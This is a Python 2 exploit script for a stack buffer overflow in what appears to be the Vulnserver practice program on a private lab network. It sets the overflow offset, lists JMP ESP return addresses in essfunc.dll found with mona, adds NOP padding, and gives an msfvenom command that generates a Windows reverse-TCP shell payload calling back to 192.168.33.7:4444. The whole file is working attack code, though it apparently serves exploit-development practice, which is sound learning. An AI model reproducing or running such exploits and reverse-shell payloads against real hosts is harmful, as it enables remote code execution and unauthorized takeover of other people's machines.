#!/usr/bin/env python2

from hexfns import int_to_bytes, reverse_endian_of_bytes

PORT = 9999
HOST = '192.168.33.16'
SHELLCODE_OFFSET = 2003  # 2003 because pattern_offset.rb with 3200 length found 386F4337 as a val at position 2003

JMP_ESP = 0xFFE4  # from asking nasm_shell.rb for JMP ESP as an opcode
NOP = '\x90'  # NOP instruction

# we use essfunc.dll because the `!mona find` command in immunity
# tells us it has no memory protections.

# these were retrieved by searching for the JMP ESP instruction (aka 0xFFE4)
# using mona.py inside of immunity debugger like this:
# `!mona find -s '\xff\xe4' -m essfunc.dll`
ESSFUNC_DLL_JMP_LOCATIONS_INTS_BIG_ENDIAN = [
    0x625011AF,
    0x625011BB,
    0x625011C7,
    0x625011D3,
    0x625011DF,
    0x625011EB,
    0x625011F7,
    0x62501203,
    0x62501205,
]

# turn the integers into their little endian versions
ESSFUNC_DLL_JMP_LOCATIONS_LITTLE_ENDIAN = [
    reverse_endian_of_bytes(int_to_bytes(i)) for i in ESSFUNC_DLL_JMP_LOCATIONS_INTS_BIG_ENDIAN
]
assert (ESSFUNC_DLL_JMP_LOCATIONS_LITTLE_ENDIAN[0] == '\xAF\x11\x50\x62')  # sanity check for first memory address

# generated from
# `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.33.7 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`

with open('data/msfvenom-payload.dat', 'rb') as f:
    SHELLCODE = f.read()

# hexdump(SHELLCODE)
